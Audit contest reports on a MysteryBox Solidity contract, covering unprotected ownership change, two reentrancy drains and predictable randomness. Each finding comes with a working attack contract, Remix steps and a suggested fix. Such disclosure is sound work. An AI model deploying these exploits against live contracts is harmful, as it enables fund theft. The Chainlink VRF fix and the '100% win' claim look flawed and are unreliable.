# My Reports For First Flight #25: MysteryBox Contest.
# H-1: Unauthorized Ownership and Fund Theft Vulnerability
https://codehawks.cyfrin.io/c/2024-09-mystery-box/s/67

**Summary** 

The smart contract contains two critical issues: lack of owner validation and improper access control in the `changeOwner` function. An attacker can leverage these vulnerabilities to gain unauthorized ownership and steal all funds from the contract using the `withdrawFunds` function.

## Vulnerability Details

**Affected Functions:**

1. `changeOwner(address _newOwner)`
2. `withdrawFunds()`

* **Issue 1: Lack of Owner Validation** The `changeOwner` function lacks proper access control, allowing anyone to change the owner of the contract. This creates a serious security risk because an unauthorized entity can become the owner without restriction.

  * **Code:**
```solidity
// MysteryBox.sol: line 111 to 123
function changeOwner(address _newOwner) public {
    owner = _newOwner;
}
```
* **Issue 2: Access Control Vulnerability** The `withdrawFunds` function allows only the owner to withdraw the contract’s balance. However, because of the lack of validation in `changeOwner`, an attacker can first become the owner, then call `withdrawFunds` to steal all funds.

- **Code:**
```solidity
function withdrawFunds() public {
    require(msg.sender == owner, "Only owner can withdraw");
    (bool success,) = payable(owner).call{value: address(this).balance}("");
    require(success, "Transfer failed");
}
```
## Impact

**Potential Consequences:**

* An attacker can call the `changeOwner` function to become the contract's owner.
* After gaining ownership, the attacker can invoke the `withdrawFunds` function to transfer all contract funds to their own wallet or their owned Exploit contract.
* Loss of contract funds, leading to financial damage and potential project collapse.

## Proof of Concept (PoC):

# Deploy this Exploit code with remix IDE Using \`MysteryBox\` contract address, Then run the attack function.

* **Step 1:** Attacker calls the `changeOwner` function, passing their own address as the new owner.
* **Step 2:** Now as the new owner, the attacker calls `withdrawFunds` to drain the contract balance.
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;


interface MyRewardContract {
     function withdrawFunds() external ;
    function changeOwner(address _newOwner) external ;

}

contract Attacker {

    MyRewardContract public target;

    constructor(address _target) {
        target = MyRewardContract(_target);
    }

    function attack() external {
        target.changeOwner(address(this));
        target.withdrawFunds(); 

    }

    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }
    receive() external payable {}
}
```
## Tools Used

## Recommendations

To fix the vulnerabilities, add proper access control to the `changeOwner` function and ensure only the current owner can transfer ownership.

* **Code Fix Example:** Add an `onlyOwner` modifier to restrict access to the `changeOwner` function.

```solidity
modifier onlyOwner() {
    require(msg.sender == owner, "Caller is not the owner");
    _;
}

function changeOwner(address _newOwner) public onlyOwner {
    require(_newOwner != address(0), "New owner can't be a zero address");
    owner = _newOwner;
}
```

# H-2: Reentrancy Vulnerability in the `claimAllRewards` Function
https://codehawks.cyfrin.io/c/2024-09-mystery-box/s/437

## Summary

The `claimAllRewards` function is intended to allow users to claim all their rewards by transferring the total value of rewards owed to them. However, the current implementation of the function is vulnerable to a **reentrancy attack**, which can allow a malicious user to exploit the contract and withdraw more funds than they are entitled to.

## Vulnerability Details

The vulnerability arises from the order of operations within the function. Specifically, the contract sends funds to the caller before updating the state variable `rewardsOwned[msg.sender]`. This opens the possibility for an attacker to re-enter the `claimAllRewards` function and repeatedly drain funds before the state is updated.
```solidity
// MysteryBox.sol: line 79 to 90
function claimAllRewards() public {
        uint256 totalValue = 0;
        for (uint256 i = 0; i < rewardsOwned[msg.sender].length; i++) {
            totalValue += rewardsOwned[msg.sender][i].value;
        }
        require(totalValue > 0, "No rewards to claim");

        (bool success,) = payable(msg.sender).call{value: totalValue}("");
        require(success, "Transfer failed-> Check");

        delete rewardsOwned[msg.sender];
    }
```
#### Detailed Breakdown:

1. **Loop Calculation of Total Rewards:** The function loops through the `rewardsOwned[msg.sender]` array to calculate the total reward value. This is safe in itself, but the vulnerability occurs later in the code execution.
2. **Funds Transfer:** After checking if the `totalValue` is greater than 0, the contract initiates a low-level call using:
```solidity
(bool success,) = payable(msg.sender).call{value: totalValue}("");
```
The low-level `.call()` method allows the recipient (in this case, `msg.sender`) to execute arbitrary code. If the `msg.sender` is a smart contract, it could include a fallback function or exploit that re-enters the `claimAllRewards` function before the state is updated.

* **State Update Vulnerability:** After transferring the funds, the contract proceeds to delete the `rewardsOwned[msg.sender]` array. However, if an attacker re-enters the function (via the fallback function) during the `call` operation, they can trigger multiple executions of the `claimAllRewards` function, each time receiving the full `totalValue`.

  This happens because the state (`rewardsOwned[msg.sender]`) is not updated (i.e., deleted) until after the funds transfer. Therefore, on each reentry, the array still holds the rewards, allowing the attacker to continuously withdraw.
## POC:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IRewardsContract {
    function buyBox() external payable;
    function openBox() external;
    function boxesOwned(address _owner) external view returns (uint256);
    function claimAllRewards() external;
}

contract Malicious {
    IRewardsContract public rewardsContract;
    address public owner;
    uint256 public callCount = 0 ;

    constructor(address _rewardsContract) {
        rewardsContract = IRewardsContract(_rewardsContract);
        owner = msg.sender;
    }

        function calculateRandom() public view returns (uint256) {
        return uint256(keccak256(abi.encodePacked(block.timestamp, address(this)))) % 100;
    }

    function buy() public payable {
         rewardsContract.buyBox{value: 0.1 ether}();
    }

    function attack() public {
        require(rewardsContract.boxesOwned(address(this)) > 0, "No boxes owned");

        uint256 predictedRandomValue = calculateRandom();

        if (predictedRandomValue >= 90) {
            rewardsContract.openBox();
            rewardsContract.claimAllRewards();
        }
    }

    receive() external payable {
        // Limit the number of recursive calls to prevent reverts
         if (address(rewardsContract).balance > 0) {
            callCount++;
            rewardsContract.claimAllRewards();
        }
    }
}
```
\*I Chained the bug together just to demonstrate how easy it could be to Exploit this Vulnerability \*

* 1=> Deploy the MysteryBox.sol Contract In Remix IDE and Fund The Contract&#x20;
* 2=> Deploy My Exploit Contract Using the MysteryBox.sol Contract Address And Fund it With any Amount (1 ether)
* 3=> call the buy function in my exploit and start calling the attack function i chained it with the randomness issue to have a quick win but when ever their is any win it triggers the \`Reentrancy Vulnerability\` and drain all the balance in the game contract&#x20;

## Impact

* **Fund Drainage:** An attacker can continuously withdraw funds from the contract until its balance is exhausted.

- **Denial of Service:** The contract may run out of funds, preventing legitimate users from claiming their rewards.

## Tools Used

* Remix IDE
* gas used to avoid revert while performing the attack: 80000000

## Recommendations

To mitigate the reentrancy vulnerability, the function should update the state before transferring any funds. This can be achieved by using the **Checks-Effects-Interactions** pattern, where the contract’s state is updated before any external calls are made. The updated function should look like this:
```solidity
function claimAllRewards() public {
    uint256 totalValue = 0;
    for (uint256 i = 0; i < rewardsOwned[msg.sender].length; i++) {
        totalValue += rewardsOwned[msg.sender][i].value;
    }
    require(totalValue > 0, "No rewards to claim");

    // Update the state before transferring funds
    delete rewardsOwned[msg.sender];

    (bool success,) = payable(msg.sender).call{value: totalValue}("");
    require(success, "Transfer failed");
}
```
By deleting `rewardsOwned[msg.sender]` before sending the funds, the attacker cannot re-enter the function and claim rewards multiple times.

#### Recommendations:

1. **Implement Checks-Effects-Interactions Pattern:** Always update the contract’s state before making external calls to avoid reentrancy vulnerabilities.
2. **Consider Using OpenZeppelin’s ReentrancyGuard:** This library provides a simple modifier (`nonReentrant`) that can be applied to functions to prevent reentrancy attacks.
3. **Limit Gas for** **`.call()`:** Limit the gas available for external calls to reduce the chances of an attacker executing complex fallback functions during the call.

# H-3: Reentrancy Vulnerability in the `claimSingleReward` Function
https://codehawks.cyfrin.io/c/2024-09-mystery-box/s/444

## Summary

The `claimSingleReward` function allows users to claim a single reward from their list of owned rewards by specifying the index. However, the current implementation is vulnerable to a **reentrancy attack**, similar to the vulnerability in the `claimAllRewards` function. This vulnerability could allow a malicious user to exploit the contract and drain funds by repeatedly calling the function before the state is updated.

## Vulnerability Details

The vulnerability is due to the fact that the function transfers funds to the caller before updating the state variable `rewardsOwned[msg.sender][_index]`. This allows an attacker to exploit the reentrancy flaw and repeatedly withdraw rewards for the same index before the state is updated.
```solidity
// MysteryBox.sol: line 92 to 101
   function claimSingleReward(uint256 _index) public {
        require(_index <= rewardsOwned[msg.sender].length, "Invalid index");
        uint256 value = rewardsOwned[msg.sender][_index].value;
        require(value > 0, "No reward to claim");

        (bool success,) = payable(msg.sender).call{value: value}("");
        require(success, "Transfer failed");

        delete rewardsOwned[msg.sender][_index];
    }
```
#### Detailed Breakdown:

* **1=> Index Check and Value Retrieval:** The function first verifies that the provided index `_index` is valid:
```solidity
require(_index <= rewardsOwned[msg.sender].length, "Invalid index");
```
Then, it retrieves the reward value from the specified index:
```solidity
uint256 value = rewardsOwned[msg.sender][_index].value;
```
If the value is greater than zero, the function proceeds to transfer the funds.

* **2=> Funds Transfer:** The contract uses a low-level call to transfer the reward to the caller:
```solidity
(bool success,) = payable(msg.sender).call{value: value}("");
```
This is the point where the vulnerability occurs. If `msg.sender` is a contract, it can execute arbitrary code in its fallback function. The contract can then re-enter the `claimSingleReward` function, allowing it to claim rewards for the same index multiple times before the state is updated.

* 3=> **State Update Vulnerability:** The state update occurs after the transfer:
```solidity
delete rewardsOwned[msg.sender][_index];
```
Because this state update happens after the funds are transferred, an attacker can re-enter the function and claim rewards multiple times for the same index before `rewardsOwned[msg.sender][_index]` is deleted.
#### Exploit Scenario:

1. An attacker’s contract calls `claimSingleReward()` with a valid `_index`.
2. The contract transfers the reward to the attacker's contract.
3. The attacker's contract uses its fallback function to re-enter `claimSingleReward()` and repeatedly claim the reward for the same index before the state is updated.
4. The attacker drains the contract’s funds by exploiting this vulnerability.
## POC:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IMysteryBox {
    struct Reward {
        string name;
        uint256 value;
    }

    function boxPrice() external view returns (uint256);
    function buyBox() external payable;
    function openBox() external;
    function getRewards() external view returns (Reward[] memory);
    function claimSingleReward(uint256 _index) external;
}

contract Exploit2 {
    IMysteryBox public mysteryBox;
    uint256 public attackIndex;
    string public lastError;

    constructor(address _mysteryBoxAddress) {
        mysteryBox = IMysteryBox(_mysteryBoxAddress);
    }

    function deposit() external payable {
        // This function allows depositing Ether into the contract
    }

    function buyAndOpenBox() public {
        require(address(this).balance >= mysteryBox.boxPrice(), "Not enough balance");
        mysteryBox.buyBox{value: mysteryBox.boxPrice()}();
        mysteryBox.openBox();
    }

    function findMostValuableReward() public returns (bool) {
        IMysteryBox.Reward[] memory rewards = mysteryBox.getRewards();
        uint256 maxValue = 0;
        bool foundValuable = false;

        for (uint256 i = 0; i < rewards.length; i++) {
            if (rewards[i].value > maxValue) {
                maxValue = rewards[i].value;
                attackIndex = i;
                foundValuable = true;
            }
        }

        return foundValuable;
    }

    function attack() external {
        bool found = findMostValuableReward();
        require(found, "No valuable reward found");

        mysteryBox.claimSingleReward(attackIndex);
    }

    receive() external payable {
        if (address(mysteryBox).balance > 0) {
            mysteryBox.claimSingleReward(attackIndex);
        }
    }

}
```
## Deploy the MysteryBox.sol in Remix IDE and Fund The Contract

* Deploy me Exploit Contract Using the game contract address and fund it with any amount (5 ether)
* Call the buyAndOpenBox function 5 times&#x20;
* Call the findMostValuableReward function to get the most valuable reward you have&#x20;
*  Then Call the attack function to activate the \`Reentrancy Vulnerability\` and drain the game contract.

## Impact

* **Fund Drainage:** The attacker can continuously claim rewards for the same index, draining the contract’s balance.

- **Denial of Service:** Legitimate users may be unable to claim their rewards as the contract’s funds could be depleted by the attacker.

## Tools Used

* Remix IDE
* gas Used to Avoid Revert While Running The Attack: 80000000

## Recommendations

The function should update the state before transferring any funds to prevent reentrancy. This can be done by using the **Checks-Effects-Interactions** pattern, where the contract’s state is updated before interacting with external accounts (such as making a funds transfer).

The updated function would look like this:
```solidity
function claimSingleReward(uint256 _index) public {
    require(_index <= rewardsOwned[msg.sender].length, "Invalid index");
    uint256 value = rewardsOwned[msg.sender][_index].value;
    require(value > 0, "No reward to claim");

    // Update the state before transferring funds
    delete rewardsOwned[msg.sender][_index];

    (bool success,) = payable(msg.sender).call{value: value}("");
    require(success, "Transfer failed");
}
```
By deleting `rewardsOwned[msg.sender][_index]` before transferring funds, the attacker cannot re-enter the function and claim the reward multiple times.

#### Recommendations:

1. **Implement Checks-Effects-Interactions Pattern:** Ensure that all state-changing operations occur before external calls like fund transfers.
2. **Use OpenZeppelin’s ReentrancyGuard:** Apply the `nonReentrant` modifier to prevent reentrancy by blocking re-entrance into the function.
3. **Gas Limit for** **`.call()`:** Consider limiting the gas available for external calls to make it harder for the fallback function to perform complex operations during the reentrancy window.


# MED-1: Predictable Randomness Vulnerability Leading to 100% Win Rate Exploit
https://codehawks.cyfrin.io/c/2024-09-mystery-box/s/71

## Summary

The `openBox()` function utilizes weak and predictable randomness, allowing an attacker to manipulate the outcome of the rewards, resulting in a 100% chance to win the highest prize. This randomness issue stems from the use of `block.timestamp` and `msg.sender` in the `keccak256` hashing function, which are easily predictable and manipulable.

* Affected Function:
```solidity
// MysteryBox.sol: line 43 to 65
function openBox() public {
    require(boxesOwned[msg.sender] > 0, "No boxes to open");

    // Generate a random number between 0 and 99
    uint256 randomValue = uint256(keccak256(abi.encodePacked(block.timestamp, msg.sender))) % 100;

    // Determine the reward based on probability
    if (randomValue < 75) {
        rewardsOwned[msg.sender].push(Reward("Coal", 0 ether));
    } else if (randomValue < 95) {
        rewardsOwned[msg.sender].push(Reward("Bronze Coin", 0.1 ether));
    } else if (randomValue < 99) {
        rewardsOwned[msg.sender].push(Reward("Silver Coin", 0.5 ether));
    } else {
        rewardsOwned[msg.sender].push(Reward("Gold Coin", 1 ether));
    }

    boxesOwned[msg.sender] -= 1;
}
```
## Vulnerability Details

The issue lies in how the random value is generated:
```solidity
uint256 randomValue = uint256(keccak256(abi.encodePacked(block.timestamp, msg.sender))) % 100;
```
* **Predictable Input**: `block.timestamp` is a public value that can be predicted or influenced by miners. Additionally, `msg.sender` is known to the attacker. Both values are easily controlled or anticipated.
* **Modulo Bias**: The use of modulo (`% 100`) further limits the randomness, making the outcome even more predictable.

By leveraging these predictable inputs, an attacker can execute transactions at precise timestamps, ensuring they always win the highest reward.

### Exploit Details:

An attacker can continuously monitor the `block.timestamp` value and execute transactions at optimal times to generate a desired `randomValue` of 99. This guarantees the attacker receives the "Gold Coin" reward (worth 1 ether) 100% of the time.

### Proof of Concept:

1. The attacker writes a script that sends a transaction at a known `block.timestamp` value.
2. By controlling the timing, the `randomValue` becomes predictable.
3. The attacker repeatedly wins with Zero Losses.

   * Exploit Code:

# Deploy this Exploit code with remix IDE Using \`MysteryBox\` contract address, Then run the buy function and Run The Play Function Continually To Win.
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IMysteryBox {
    function buyBox() external payable;
    function openBox() external;
    function boxesOwned(address _owner) external view returns (uint256);
    function claimAllRewards() external ;
}

contract MysteryBoxExploit {
    IMysteryBox public mysteryBox;
    address public owner;

    constructor(address _mysteryBoxAddress) {
        mysteryBox = IMysteryBox(_mysteryBoxAddress);
        owner = msg.sender;
    }

    function calculateRandom() public view returns (uint256) {
        return uint256(keccak256(abi.encodePacked(block.timestamp, address(this)))) % 100;
    }

    function buy() public payable {
        require(msg.sender == owner, "Not owner");
        mysteryBox.buyBox{value: 0.1 ether}();
    }

    function play() public {
        require(msg.sender == owner, "Not owner");
        require(mysteryBox.boxesOwned(address(this)) > 0, "No boxes owned");

        uint256 predictedRandomValue = calculateRandom();

        if (predictedRandomValue >= 90) {
            mysteryBox.openBox();
            mysteryBox.claimAllRewards();
        }
    }
    receive() external payable {}
}
```
## Impact

The vulnerability allows an attacker to:

* Exploit the `openBox()` function to always win valuable reward With Zero Losses.
* Drain the contract of valuable tokens or funds by continuously receiving the highest reward.
* Undermine the fairness of the game or system by manipulating the outcome.

## Tools Used

## Recommendations

To fix this issue, the randomness source must be improved by incorporating more unpredictable values, such as Chainlink VRF (Verifiable Random Function) or other secure oracle-based solutions. Here's an updated version using Chainlink VRF for secure randomness:
```solidity
import "@chainlink/contracts/src/v0.8/VRFConsumerBase.sol";

contract SecureBox is VRFConsumerBase {
    bytes32 internal keyHash;
    uint256 internal fee;

    constructor()
        VRFConsumerBase(
            0x514910771AF9Ca656af840dff83E8264EcF986CA, // VRF Coordinator
            0x514910771AF9Ca656af840dff83E8264EcF986CA  // LINK Token
        )
    {
        keyHash = 0x6c3699283bda56ad74f6b855546325b68d482e983852a7b6d5d007f8fe3388f5;
        fee = 0.1 * 10**18; // 0.1 LINK
    }

    function openBox() public {
        require(boxesOwned[msg.sender] > 0, "No boxes to open");
        requestRandomness(keyHash, fee);
    }

    function fulfillRandomness(bytes32 requestId, uint256 randomness) internal override {
        uint256 randomValue = randomness % 100;
        
        if (randomValue < 75) {
            rewardsOwned[msg.sender].push(Reward("Coal", 0 ether));
        } else if (randomValue < 95) {
            rewardsOwned[msg.sender].push(Reward("Bronze Coin", 0.1 ether));
        } else if (randomValue < 99) {
            rewardsOwned[msg.sender].push(Reward("Silver Coin", 0.5 ether));
        } else {
            rewardsOwned[msg.sender].push(Reward("Gold Coin", 1 ether));
        }

        boxesOwned[msg.sender] -= 1;
    }
}
```

![bandicam 2024-10-08 22-43-50-079](https://github.com/user-attachments/assets/d5ba0214-4763-4a87-9d18-6106d319acc5)
